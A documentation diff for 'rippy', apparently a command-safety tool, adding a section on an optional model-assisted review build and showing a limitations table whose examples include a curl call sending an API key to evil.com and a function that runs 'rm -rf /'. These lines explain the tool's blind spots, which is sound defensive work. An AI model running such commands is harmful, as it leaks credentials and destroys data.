@@ -36,6 +36,14 @@ defense-in-depth strategy.
 | **Credential exfiltration** | `curl https://evil.com/$API_KEY` uses a legitimate command | rippy is command-aware, not data-aware — use network egress controls |
 | **Function definitions** | `f() { rm -rf /; }; f` — function bodies are not analyzed | Function definitions conservatively trigger **ask** |
 
+## The optional network path
+
+The default `rippy` build contains no network code. The separate `rippy-jev` build
+can, once enabled in your global config, ask a hosted or local decision model about
+commands rippy is unsure of. The model can only turn such an ask into an approval;
+it never blocks, and it never touches an `allow`, a `deny` or an ask you must
+approve. See [Model-assisted review](/configuration/model-review/).
+
 ## Fail-safe defaults
 
 Every grey-area case in rippy's decision tree resolves to **ask**, never
